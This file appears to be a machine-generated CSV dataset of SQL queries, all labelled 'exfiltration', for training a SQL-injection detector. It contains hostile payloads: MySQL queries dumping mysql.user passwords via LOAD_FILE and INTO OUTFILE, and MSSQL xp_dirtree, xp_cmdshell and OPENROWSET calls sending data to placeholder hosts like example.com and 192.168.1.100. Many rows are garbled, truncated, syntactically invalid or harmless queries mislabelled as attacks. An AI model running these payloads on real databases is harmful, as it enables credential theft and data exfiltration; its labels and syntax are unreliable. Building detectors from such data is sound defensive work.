query,label,label_name,source
"SELECT user, host, password, LOAD_FILE('/proc/stat') INTO OUTFILE '/var/www/html/stat.txt'",4,exfiltration,generated_groq_mysql_advanced
"SELECT user, host, password, LOAD_FILE('/etc/issue.net') INTO OUTFILE '/var/www/html/issue.txt'",4,exfiltration,generated_groq_mysql_advanced
UNION SELECT * FROM (SELECT user FROM mysql.user WHERE user = 'admin' UNION SELECT host FROM mysql.user) AS tmp,4,exfiltration,generated_groq_mysql_advanced
"SELECT user, host, password, LOAD_FILE('/proc/net/tcp') INTO OUTFILE '/var/www/html/tcp_stats.txt'",4,exfiltration,generated_groq_mysql_advanced
SELECT id FROM mysql.user WHERE host = '' INTO OUTFILE '/var/lib/mysql/1.txt',4,exfiltration,generated_groq_mysql_advanced
SELECT GROUP_CONCAT(DISTINCT password FROM mysql.user) INTO OUTFILE '/var/lib/mysql/2.txt',4,exfiltration,generated_groq_mysql_advanced
UNION SELECT * FROM (SELECT 'a' UNION SELECT 'b') a UNION SELECT * FROM mysql.user INTO OUTFILE '/var/lib/mysql/3.txt',4,exfiltration,generated_groq_mysql_advanced
LOAD_FILE('/var/lib/mysql/3.txt') INTO TABLE mysql.user,4,exfiltration,generated_groq_mysql_advanced
SELECT LOAD_FILE('/var/lib/mysql/2.txt') INTO OUTFILE '/var/lib/mysql/4.txt',4,exfiltration,generated_groq_mysql_advanced
WITH cte AS (SELECT * FROM mysql.user) SELECT * FROM cte INTO OUTFILE '/var/lib/mysql/5.txt',4,exfiltration,generated_groq_mysql_advanced
SELECT id FROM mysql.user WHERE host = '' AND password = LOAD_FILE('/var/lib/mysql/3.txt'),4,exfiltration,generated_groq_mysql_advanced
SELECT * FROM (SELECT 1 UNION SELECT 2) a UNION SELECT * FROM mysql.user INTO OUTFILE '/var/lib/mysql/6.txt',4,exfiltration,generated_groq_mysql_advanced
UNION SELECT * FROM (SELECT '' UNION SELECT 'a') a UNION SELECT * FROM mysql.user INTO OUTFILE '/var/lib/mysql/7.txt',4,exfiltration,generated_groq_mysql_advanced
"SELECT id, host FROM mysql.user WHERE FIND_IN_SET(password, GROUP_CONCAT(DISTINCT password)) > 0 INTO OUTFILE '/var/lib/mysql/8.txt'",4,exfiltration,generated_groq_mysql_advanced
"SELECT id FROM mysql.user WHERE SUBSTRING_INDEX(password, 'x', 1) = '' AND password = LOAD_FILE('/var/lib/mysql/15.txt')",4,exfiltration,generated_groq_mysql_advanced
"SELECT * FROM mysql.user WHERE SUBSTRING_INDEX(password, 'x', 1) = '' INTO OUTFILE '/var/lib/mysql/9.txt'",4,exfiltration,generated_groq_mysql_advanced
UNION SELECT * FROM (SELECT 'a' UNION SELECT 'x') a UNION SELECT * FROM mysql.user INTO OUTFILE '/var/lib/mysql/10.txt',4,exfiltration,generated_groq_mysql_advanced
"SELECT id, host FROM mysql.user WHERE FIND_IN_SET(SUBSTRING_INDEX(password, 'x', 1), GROUP_CONCAT(DISTINCT SUBSTRING_INDEX(password, 'x', 1))) > 0 INTO OUTFILE '/var/lib/mysql/11.txt'",4,exfiltration,generated_groq_mysql_advanced
SELECT id FROM mysql.user WHERE password = LOAD_FILE('/var/lib/mysql/12.txt') AND host = '',4,exfiltration,generated_groq_mysql_advanced
SELECT * FROM mysql.user WHERE password = LOAD_FILE('/var/lib/mysql/13.txt') AND host = '' INTO OUTFILE '/var/lib/mysql/12.txt',4,exfiltration,generated_groq_mysql_advanced
"WITH cte AS (SELECT * FROM mysql.user) SELECT * FROM cte WHERE FIND_IN_SET(SUBSTRING_INDEX(password, 'x', 1), GROUP_CONCAT(DISTINCT SUBSTRING_INDEX(password, 'x', 1))) > 0 INTO OUTFILE '/var/lib/mysql/13.txt'",4,exfiltration,generated_groq_mysql_advanced
SELECT LOAD_FILE('/var/lib/mysql/13.txt') INTO OUTFILE '/var/lib/mysql/14.txt',4,exfiltration,generated_groq_mysql_advanced
SELECT GROUP_CONCAT(DISTINCT id) INTO OUTFILE '/var/lib/mysql/16.txt',4,exfiltration,generated_groq_mysql_advanced
"SELECT * FROM mysql.user WHERE FIND_IN_SET(id, LOAD_FILE('/var/lib/mysql/18.txt')) > 0 INTO OUTFILE '/var/lib/mysql/17.txt'",4,exfiltration,generated_groq_mysql_advanced
"SELECT GROUP_CONCAT(DISTINCT CONCAT(id, 'x', host)) INTO OUTFILE '/var/lib/mysql/18.txt'",4,exfiltration,generated_groq_mysql_advanced
SELECT * FROM mysql.user INTO OUTFILE '/tmp/user.txt',4,exfiltration,generated_groq_mysql_advanced
SELECT group_concat(password SEPARATOR '') FROM mysql.user INTO OUTFILE '/tmp/user_password.txt',4,exfiltration,generated_groq_mysql_advanced
"SELECT user, password FROM (SELECT user, password FROM mysql.user WHERE user LIKE '%admin%') AS tmp INTO OUTFILE '/tmp/admin_user.txt'",4,exfiltration,generated_groq_mysql_advanced
"(SELECT * FROM (SELECT user, password FROM mysql.user WHERE user LIKE '%admin%') AS tmp UNION SELECT user, password FROM information_schema.tables) INTO OUTFILE '/tmp/user_and_tables.txt'",4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM mysql.user UNION SELECT * FROM information_schema.processlist) INTO OUTFILE '/tmp/user_and_processes.txt',4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM mysql.user UNION SELECT * FROM information_schema.tablestats) INTO OUTFILE '/tmp/user_and_stats.txt',4,exfiltration,generated_groq_mysql_advanced
SELECT LOAD_FILE('/tmp/exiftool') INTO OUTFILE '/tmp/exiftool_contents.txt',4,exfiltration,generated_groq_mysql_advanced
"(SELECT * FROM (SELECT LOAD_FILE('/tmp/exiftool') AS contents) AS tmp UNION SELECT user, password FROM mysql.user) INTO OUTFILE '/tmp/exiftool_and_users.txt'",4,exfiltration,generated_groq_mysql_advanced
"SELECT user, password FROM information_schema.processlist INTO OUTFILE '/tmp/process_list.txt'",4,exfiltration,generated_groq_mysql_advanced
"SELECT user, password FROM information_schema.tables INTO OUTFILE '/tmp/table_list.txt'",4,exfiltration,generated_groq_mysql_advanced
"SELECT group_concat(host SEPARATOR ', ') FROM information_schema.processlist INTO OUTFILE '/tmp/host_list.txt'",4,exfiltration,generated_groq_mysql_advanced
"SELECT group_concat(table_name SEPARATOR ', ') FROM information_schema.tables INTO OUTFILE '/tmp/table_list.txt'",4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM information_schema.tables UNION SELECT * FROM mysql.user) INTO OUTFILE '/tmp/tables_and_users.txt',4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM information_schema.tables UNION SELECT * FROM information_schema.processlist) INTO OUTFILE '/tmp/tables_and_processes.txt',4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM information_schema.tables UNION SELECT * FROM information_schema.routers) INTO OUTFILE '/tmp/tables_and_routers.txt',4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM information_schema.processlist UNION SELECT * FROM information_schema.routers) INTO OUTFILE '/tmp/processes_and_routers.txt',4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM information_schema.tables UNION SELECT * FROM information_schema.collation) INTO OUTFILE '/tmp/tables_and_collation.txt',4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM information_schema.processlist UNION SELECT * FROM information_schema.collation) INTO OUTFILE '/tmp/processes_and_collation.txt',4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM information_schema.tables UNION SELECT * FROM information_schema.data_dict) INTO OUTFILE '/tmp/tables_and_data_dict.txt',4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM information_schema.processlist UNION SELECT * FROM information_schema.data_dict) INTO OUTFILE '/tmp/processes_and_data_dict.txt',4,exfiltration,generated_groq_mysql_advanced
(SELECT * FROM information_schema.routers UNION SELECT * FROM INFORMATION_SCHEMA.PROFILING) INTO OUTFILE '/tmp/routers_and_profiling.txt',4,exfiltration,generated_groq_mysql_advanced
UNION SELECT LOAD_FILE('/var/tmp/user.txt');,4,exfiltration,generated_groq_mysql_advanced
SELECT GROUP_CONCAT(COLUMN_NAME) INTO OUTFILE '/var/tmp/cols.txt' FROM information_schema.columns WHERE table_name='processlist';,4,exfiltration,generated_groq_mysql_advanced
UNION SELECT LOAD_FILE('/var/tmp/cols.txt');,4,exfiltration,generated_groq_mysql_advanced
WITH recursive users AS (SELECT user FROM mysql.user WHERE password='*') SELECT * FROM users UNION SELECT LOAD_FILE('/var/tmp/user.txt');,4,exfiltration,generated_groq_mysql_advanced
"SELECT CONCAT_WS(',', GROUP_CONCAT(COLUMN_NAME), GROUP_CONCAT(COLUMN_TYPE)) INTO OUTFILE '/var/tmp/scanner.txt' FROM information_schema.columns WHERE table_name='processlist';",4,exfiltration,generated_groq_mysql_advanced
UNION SELECT LOAD_FILE('/var/tmp/scanner.txt');,4,exfiltration,generated_groq_mysql_advanced
"SELECT GROUP_CONCAT(USER, ',', Host, ',', Password) INTO OUTFILE '/var/tmp/userinfo.txt' FROM mysql.user;",4,exfiltration,generated_groq_mysql_advanced
UNION SELECT LOAD_FILE('/var/tmp/userinfo.txt');,4,exfiltration,generated_groq_mysql_advanced
"SELECT @sql := CONCAT('SELECT * FROM ', GROUP_CONCAT(TABLE_NAME), ';'); PREPARE stmt FROM @sql; EXECUTE stmt; DEALLOCATE PREPARE stmt;",4,exfiltration,generated_groq_mysql_advanced
"SELECT GROUP_CONCAT(COLUMN_NAME, ',', COLUMN_TYPE) INTO OUTFILE '/var/tmp/columns.txt' FROM information_schema.columns WHERE table_schema='mysql' AND table_name='user';",4,exfiltration,generated_groq_mysql_advanced
"XP_CMDSHelp xp_dirtree '\\', 'C:\\'",4,exfiltration,generated_groq_mssql_simple
"EXEC master..xp_dirtree '\\', 'C:\\'",4,exfiltration,generated_groq_mssql_simple
EXEC xp_dirtree 'file:///C:\\Program\ Files',4,exfiltration,generated_groq_mssql_simple
"EXEC xp_dirtree '\\\\DC01\\c$', 'C:\\'",4,exfiltration,generated_groq_mssql_simple
"EXEC xp_dirtree '\\', N'C:\\\\Program Files'",4,exfiltration,generated_groq_mssql_simple
EXEC xp_dirtree N'\\,4,exfiltration,generated_groq_mssql_simple
", ''C:\\\\'''; EXEC sp_executesql @sql",4,exfiltration,generated_groq_mssql_simple
"declare @sql nvarchar(4000); set @sql = N'EXEC OPENROWSET (''Microsoft.SQLServerError '' , ''server IP'' , ''username '' , ''password '' , ''SELECT * FROM table'')'; EXEC sp_executesql @sql",4,exfiltration,generated_groq_mssql_simple
"INSERT INTO OPENROWSET ('Microsoft.SQLServerError', 'server IP', 'username ', 'password', 'SELECT * FROM table') SELECT * FROM table",4,exfiltration,generated_groq_mssql_simple
"EXEC sys.xp_dirtree '\\\\DC01\\c$', 'C:\\\\Users'",4,exfiltration,generated_groq_mssql_simple
"EXEC ('xp_dirtree ' + @path + '''', ''' + 'C:\\\\\\'",4,exfiltration,generated_groq_mssql_simple
"SELECT MASTER.dbo.xp_dirtree('\\\\' + CONVERT(VARCHAR, SERVERPROPERTY('MACHINE_NAME')), NULL, 1, 1) FOR XML AUTO",4,exfiltration,generated_groq_mssql_simple
"OPENROWSET('SQL Server', 'Driver={ODBC Driver 17 for SQL Server};Server=myServerAddress;Database=myDataBase;UID=myUsername;PWD=myPassword', 'SELECT * FROM myTableName')",4,exfiltration,generated_groq_mssql_simple
SELECT 1 + (SELECT COUNT(*) FROM master..sysdatabases),4,exfiltration,generated_groq_mssql_simple
SELECT TOP 1 * INTO #temp FROM table1 FOR XML AUTO;SELECT * FROM #temp,4,exfiltration,generated_groq_mssql_simple
EXEC ('SELECT * FROM mylinkedserver..mytable') AT mylinkedserver,4,exfiltration,generated_groq_mssql_simple
"SELECT CONVERT(VARCHAR, CAST(NEWID() AS BINARY(4)) + GETDATE(), 120)",4,exfiltration,generated_groq_mssql_simple
EXEC('bcp ,4,exfiltration,generated_groq_mssql_simple
 queryout ,4,exfiltration,generated_groq_mssql_simple
 -T -c -S localhost -U myuser -P mypassword''),4,exfiltration,generated_groq_mssql_simple
"OPENROWSET('Microsoft.Jet.OLEDB.4.0', 'Text;Database=C:\path\file.csv;HDR=YES;IMEX=2', 'SELECT * FROM [file.csv]')",4,exfiltration,generated_groq_mssql_simple
"INSERT INTO OPENROWSET('SQL Server', 'Driver={ODBC Driver 17 for SQL Server};Server=myServerAddress;Database=myDataBase;UID=myUsername;PWD=myPassword', 'myTableName') SELECT * FROM table1",4,exfiltration,generated_groq_mssql_simple
"BULK INSERT mytable FROM 'C:\path\file.csv' WITH (FIRSTROW=2, FIELDTERMINATOR = ',', ROWTERMINATOR = '\n')",4,exfiltration,generated_groq_mssql_simple
"SELECT * FROM OPENROWSET('SQLOLEDB', 'DRIVER={Microsoft Access Text Driver (*.txt, *.csv)};DefaultDir=C:\path\;Extensions=asc,csv,tab,txt', 'SELECT * FROM [file.csv]')",4,exfiltration,generated_groq_mssql_simple
EXEC xp_cmdshell 'powershell -Command ,4,exfiltration,generated_groq_mssql_simple
data,4,exfiltration,generated_groq_mssql_simple
INSERT INTO mylinkedserver..mytable EXEC ('SELECT * FROM table1') AT mylinkedserver,4,exfiltration,generated_groq_mssql_simple
SELECT TOP 1 * INTO #temp FROM table1 FOR XML AUTO;EXEC xp_cmdshell 'copy C:\path\#temp.xml C:\path\file.xml',4,exfiltration,generated_groq_mssql_simple
"OPENROWSET('SQL Server', 'Driver={ODBC Driver 17 for SQL Server};Server=myServerAddress;Database=myDataBase;UID=myUsername;PWD=myPassword', 'SELECT * FROM table1') INTO OUTFILE 'C:\path\file.csv' FIELDS TERMINATED BY , ENCLOSED BY \"",\"" LINES TERMINATED BY \n''],
[",4,exfiltration,generated_groq_mssql_simple
",\"" LINES TERMINATED BY \n'",4,exfiltration,generated_groq_mssql_simple
"EXEC xp_dirtree 'C:\\', 1, 0, 1;",4,exfiltration,generated_groq_mssql_simple
"SELECT * INTO #tmp FROM OPENROWSET('SQLNCLI', 'Server=myServer;Trusted_Connection=yes;', 'SELECT * FROM myTable');",4,exfiltration,generated_groq_mssql_simple
"INSERT INTO myTable (Column1, Column2) SELECT Column1, Column2 FROM #tmp;SELECT * FROM #tmp;DROP TABLE #tmp;",4,exfiltration,generated_groq_mssql_simple
"Bulk Insert myTable FROM 'C:\file.txt' WITH (FORMAT 'CSV', FIRSTROW=2, FIELDTERMINATOR = ',', ROWTERMINATOR = '\n');",4,exfiltration,generated_groq_mssql_simple
DECLARE @cmd nvarchar(255); SET @cmd = 'powershell.exe ,4,exfiltration,generated_groq_mssql_simple
" '+Convert(nvarchar, 1234); Exec xp_cmdshell @cmd;",4,exfiltration,generated_groq_mssql_simple
"SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=myServer;Trusted_Connection=yes;', 'SELECT * FROM myTable');",4,exfiltration,generated_groq_mssql_simple
"Bulk Insert myTable FROM 'C:\file.txt' WITH (FORMAT 'CSV', FIRSTROW=2, FIELDTERMINATOR = ',', ROWTERMINATOR = '\n');INSERT INTO myTable (Column1, Column2) VALUES ('123','456');",4,exfiltration,generated_groq_mssql_simple
"INSERT INTO myTable (Column1, Column2) SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=myServer;Trusted_Connection=yes;', 'SELECT * FROM myTable');",4,exfiltration,generated_groq_mssql_simple
"EXEC xp_dirtree 'C:\\', -1, 0, 1, 0;",4,exfiltration,generated_groq_mssql_simple
DECLARE @xml xml; SET @xml = (SELECT * FROM myTable FOR XML PATH);,4,exfiltration,generated_groq_mssql_simple
"Bulk Insert myTable FROM 'C:\file.txt' WITH (FORMAT 'CSV', FIRSTROW=2, FIELDTERMINATOR = ',', ROWTERMINATOR = '\n');SET @xml = convert(nvarchar(max), BulkCollectedData);",4,exfiltration,generated_groq_mssql_simple
"INSERT INTO myTable (Column1, Column2) SELECT * FROM OPENROWSET ('MSSQL', 'myServer', 'myTable');",4,exfiltration,generated_groq_mssql_simple
"EXEC xp_dirtree 'C:\\', -1, 1, 1;",4,exfiltration,generated_groq_mssql_simple
"SELECT * FROM OPENROWSET ('MSSQL', 'myServer', 'myTable');INSERT INTO myTable (Column1, Column2) VALUES ('123','456');",4,exfiltration,generated_groq_mssql_simple
BULK INSERT myTable FROM 'C:\\file.txt' WITH (FORMAT 'CSV');,4,exfiltration,generated_groq_mssql_simple
"EXEC xp_dirtree '\\\\example.com\\target\\directory', 1, 1",4,exfiltration,generated_groq_mssql_simple
"OPENROWSET('SQLNCLI', 'Server=myServerAddress;Database=myDataBase;Trusted_Connection=yes;', 'SELECT * FROM table')",4,exfiltration,generated_groq_mssql_simple
"SELECT 1 FOR XML PATH(''), TYPE",4,exfiltration,generated_groq_mssql_simple
"BULK INSERT table FROM '\\\\example.com\\target\\directory\\file.txt' WITH (FIRSTROW = 2, MAXERRORS = 0)",4,exfiltration,generated_groq_mssql_simple
"OPENROWSET('SQLOLEDB', 'DRIVER={SQL Native Client};SERVER=myServerAddress;DATABASE=myDataBase;', 'SELECT * FROM table')",4,exfiltration,generated_groq_mssql_simple
"SELECT table_name, table_schema INTO #tables FROM sys.tables FOR XML PATH('')",4,exfiltration,generated_groq_mssql_simple
"BULK INSERT table FROM '\\\\example.com\\target\\directory\\file.txt' WITH (DATAFILETYPE = 'csv', FIRSTROW = 2, MAXERRORS = 0)",4,exfiltration,generated_groq_mssql_simple
EXEC xp_cmdshell 'copy \\example.com\path\file.txt c:\local\path',4,exfiltration,generated_groq_mssql_simple
"SELECT * INTO #temp FROM OPENROWSET('SQLOLEDB', 'DRIVER={ODBC Driver 17 for SQL Server};SERVER=myServerAddress;DATABASE=myDataBase;', 'SELECT * FROM table')",4,exfiltration,generated_groq_mssql_simple
SELECT table_name INTO #tables FROM sys.tables FOR XML PATH(''),4,exfiltration,generated_groq_mssql_simple
"EXEC xp_dirtree '\\\\example.com\\target\\directory', 1, 1, 'c:\local\output'",4,exfiltration,generated_groq_mssql_simple
"BULK INSERT table FROM 'C:\local\path\file.txt' WITH (DATAFILETYPE = 'csv', FIRSTROW = 2, MAXERRORS = 0)",4,exfiltration,generated_groq_mssql_simple
"OPENROWSET('MSSQL', 'DRIVER={ODBC Driver 17 for SQL Server};SERVER=myServerAddress;DATABASE=myDataBase;', 'SELECT * FROM table')",4,exfiltration,generated_groq_mssql_simple
SELECT table_schema + '.' + table_name INTO #tables FROM sys.tables FOR XML PATH(''),4,exfiltration,generated_groq_mssql_simple
"SELECT 'example.com', 'example.com', 'example\\directory' INTO #columns FROM DUAL FOR XML PATH('')",4,exfiltration,generated_groq_mssql_simple
"OPENROWSET('SQLNCLI', 'Server=myServerAddress;Database=myDataBase;Trusted_Connection=yes;', 'SELECT * FROM table FOR XML AUTO')",4,exfiltration,generated_groq_mssql_simple
"SELECT * FROM OPENROWSET('SQLNCLI', 'Server=mydns.com;UID=myuser;PWD=mypass;', 'SELECT * FROM mytable');",4,exfiltration,generated_groq_mssql_simple
"Declare @sql nvarchar(max) = 'sql = SELECT * FROM OPENROWSET(''SQLNCLI'', ''Server=mydns.com;UID=myuser;PWD=mypass;'') mytable;'; EXEC xp_cmdshell 'powershell -Command ",4,exfiltration,generated_groq_mssql_simple
"EXEC xp_dirtree 'C:\mydirectory', 1, 1, 1;",4,exfiltration,generated_groq_mssql_simple
"SELECT * FROM OPENROWSET('SQLNCLI', 'Server=mydns.com', 'SELECT sys.server_principals.name as server_name FROM sys.server_principals');",4,exfiltration,generated_groq_mssql_simple
"SELECT * FROM OPENROWSET('SQLNCLI', 'Server=mydns.com', 'SELECT suser_id FROM sys.dm_exec_sessions WHERE status = ''sleeping''');",4,exfiltration,generated_groq_mssql_simple
"Declare @xml xml; SELECT @xml = ('<myxml>'' + STRING_AGG(name, '') FOR XML PATH('' '') + ''</myxml>');",4,exfiltration,generated_groq_mssql_simple
"INSERT INTO OPENROWSET('SQLNCLI', 'Server=mydns.com', 'mytable') SELECT * FROM mytable",4,exfiltration,generated_groq_mssql_simple
"DECLARE @sql nvarchar(max) = N'select ''' + name + ''' from mytable for xml path(''''), type'; EXEC sp_executesql @sql;",4,exfiltration,generated_groq_mssql_simple
"SELECT * FROM OPENROWSET('SQLNCLI', 'Server=mydns.com', 'SELECT @@SERVERNAME');",4,exfiltration,generated_groq_mssql_simple
"EXEC (''INSERT OPENROWSET(''SQLNCLI'',''Server=mydns.com;'');'');",4,exfiltration,generated_groq_mssql_simple
"DECLARE @t TABLE (col1 nvarchar(100), col2 nvarchar(100)); INSERT INTO @t SELECT 'col1', 'val1' UNION SELECT 'col2', 'val2'; INSERT INTO OPENROWSET('SQLNCLI', 'Server=mydns.com;', 'mytable') SELECT * FROM @t;",4,exfiltration,generated_groq_mssql_simple
"DECLARE @xmlxml = N'<root><name>John</name><name>Jane</name></root>'; SELECT @xml = ('<myxml>'' + XML_DATA(type).value(''./root/name[1]'', 'nvarchar(100)'') + ''</myxml>');",4,exfiltration,generated_groq_mssql_simple
"SELECT * FROM OPENROWSET('SQLNCLI', 'Server=mydns.com', 'SELECT * FROM [linked_server_name].[schema_name].[table_name]');",4,exfiltration,generated_groq_mssql_simple
"INSERT INTO OPENROWSET('SQLNCLI', 'Server=mydns.com;', 'mytable', 'mytable', 'sa','password') SELECT * FROM [table_name]",4,exfiltration,generated_groq_mssql_simple
"SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=mydns.com', 'SELECT * FROM mytable', 'DRIVER={Microsoft SQL Server}(ODBC Driver 17.9)');",4,exfiltration,generated_groq_mssql_simple
"EXEC MASTER..xp_dirtree 'C:\mydirectory', 1, 1, 1;",4,exfiltration,generated_groq_mssql_simple
"DECLARE @sql nvarchar(max) = N'select ''' + name + ''', '''' + CONVERT(varchar, COUNT(*) ) + '''' from mytable GROUP BY name FOR XML PATH(''''), TYPE'; EXEC sp_executesql @sql;",4,exfiltration,generated_groq_mssql_simple
"SELECT BulkColumn FROM OPENROWSET (BULK 'C:\mydirectory\myfile', SINGLE_CLOB) AS MyFile;",4,exfiltration,generated_groq_mssql_simple
"INSERT INTO OPENROWSET('SQLOLEDB','Server=mydns.com;' 'mytable', 'SELECT * FROM [linked_server_name].[schema_name].[table_name]');",4,exfiltration,generated_groq_mssql_simple
"SELECT * INTO mytable FROM OPENROWSET('SQLOLEDB',",4,exfiltration,generated_groq_mssql_simple
"INSERT INTO OpenRowset('SQLOLEDB','dns=example.com;uid=;pwd=;', 'select * from [table_name]') SELECT * FROM [table_name]",4,exfiltration,generated_groq_mssql_simple
"SELECT OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM MyTable')')",4,exfiltration,generated_groq_mssql_advanced
"EXEC master..xp_dirtree 'C:\*\*', 1, 1",4,exfiltration,generated_groq_mssql_advanced
"SELECT * INTO #Temp FROM OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM MyTable')')",4,exfiltration,generated_groq_mssql_advanced
"SELECT * FROM #Temp WHERE LEN(CAST(REPLACE(REPLACE(REPLACE(CAST(CAST(SERVERPROPERTY('MACHINE_NAME') AS VARCHAR(50)),'@',''),'\\','-'),' ','_'),'|','*') AS VARCHAR(100))) > 100",4,exfiltration,generated_groq_mssql_advanced
"SELECT * INTO #Temp2 FROM OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM (SELECT DISTINCT TOP 10 * FROM MyTable) As Subquery')')",4,exfiltration,generated_groq_mssql_advanced
DECLARE @xml xml = (SELECT * FROM MyTable FOR XML PATH('')),4,exfiltration,generated_groq_mssql_advanced
"SELECT * INTO #Temp3 FROM OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM (SELECT DISTINCT TOP 10 * FROM (SELECT DISTINCT TOP 10 * FROM MyTable) As Subquery) As Subquery1')','MSDASQL','Driver={SQL Server};Server=[sqlserver];Database=master;UID=admin;PWD=admin')",4,exfiltration,generated_groq_mssql_advanced
SELECT TOP 1 @xml.query('data(MyTable)'),4,exfiltration,generated_groq_mssql_advanced
"SELECT * INTO #Temp4 FROM (SELECT * FROM OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM OPENROWSET('HTTP', 'http://192.168.1.100/','SELECT * FROM MyTable')')) As Subquery",4,exfiltration,generated_groq_mssql_advanced
INSERT INTO [linked_server].MyTable EXEC ('SELECT * FROM MyTable'),4,exfiltration,generated_groq_mssql_advanced
"EXEC master..xp_dirtree 'C:\*\*', 1, 1 WHERE LEN(LTRIM(RTRIM(CAST(CAST(SERVERPROPERTY('MACHINE_NAME') AS VARCHAR(50)) AS CHAR(100)))))) > 100",4,exfiltration,generated_groq_mssql_advanced
"SELECT CAST(REPLACE(REPLACE(REPLACE(CAST(SERVERPROPERTY('MACHINE_NAME') AS VARCHAR(50)),'@',''),'\\','-'),' ','_') AS VARCHAR(100)) FROM #Temp5",4,exfiltration,generated_groq_mssql_advanced
INSERT INTO [linked_server].MyTable EXEC ('SELECT * FROM (SELECT DISTINCT TOP 100 * FROM MyTable) As Subquery'),4,exfiltration,generated_groq_mssql_advanced
DECLARE @xml2 xml = (SELECT TOP 10 * FROM MyTable FOR XML PATH('')),4,exfiltration,generated_groq_mssql_advanced
EXEC master..xp_dirtree '\\';,4,exfiltration,generated_groq_mssql_advanced
"INSERT INTO OPENROWSET('SQLNCLI', 'Server=myserver;Trusted_Connection=yes;', 'SELECT * FROM mydb..mytable');",4,exfiltration,generated_groq_mssql_advanced
"SELECT CONVERT(VARBINARY(MAX), CONVERT(VARBINARY(MAX), (SELECT * FROM mydb..mytable FOR XML PATH(''))));",4,exfiltration,generated_groq_mssql_advanced
"EXEC sp_addlinkedserver 'newserver', 'mydatasource';INSERT INTO OPENROWSET('newserver', 'SELECT * FROM mydb..mytable');",4,exfiltration,generated_groq_mssql_advanced
"SELECT * INTO #tmp FROM OPENROWSET('newserver', '', '');",4,exfiltration,generated_groq_mssql_advanced
"BULK INSERT #tmp FROM '\\\\myserver\\share\\data.csv' WITH (FORMAT='CSV', FIRSTROW=2);",4,exfiltration,generated_groq_mssql_advanced
SELECT * FROM mydb..mytable WHERE column IN (SELECT column FROM #tmp);,4,exfiltration,generated_groq_mssql_advanced
EXEC master..xp_dirtree '\\.\\,4,exfiltration,generated_groq_mssql_advanced
;EXEC xp_dirtree '\\.\\,4,exfiltration,generated_groq_mssql_advanced
"WITH mycte AS (SELECT column FROM mydb..mytable UNION ALL SELECT column FROM OPENROWSET('SQLNCLI', 'Server=myserver;Trusted_Connection=yes;', 'SELECT * FROM mydb..mytable')) SELECT * INTO #tmp FROM mycte;",4,exfiltration,generated_groq_mssql_advanced
EXEC master..xp_dirtree '\\server`;xp_dirtree '';EXEC xp_dirtree '\\server`;xp_dirtree ''; EXEC xp_dirtree '\\'; EXEC xp_dirtree '';,4,exfiltration,generated_groq_mssql_advanced
"SELECT * INTO #tmp FROM OPENROWSET('SQLNCLI', 'Server=myserver;Trusted_Connection=yes;', 'SELECT * FROM mydb..mytable') WHERE column IN (SELECT column FROM OPENROWSET('SQLNCLI', 'Server=myserver;Trusted_Connection=yes;', 'SELECT column FROM mydb..mytable'));",4,exfiltration,generated_groq_mssql_advanced
"BULK INSERT #tmp FROM '\\\\myserver\\share\\data.csv' WITH (FORMAT='CSV', FIRSTROW=2);SELECT * FROM #tmp WHERE column IN (SELECT column FROM mydb..mytable);",4,exfiltration,generated_groq_mssql_advanced
"EXEC sp_addlinkedserver 'newserver', 'mydatasource';SELECT * INTO #tmp FROM OPENROWSET('newserver', '', '');INSERT INTO OPENROWSET('SQLNCLI', 'Server=myserver;Trusted_Connection=yes;', 'SELECT * FROM #tmp');",4,exfiltration,generated_groq_mssql_advanced
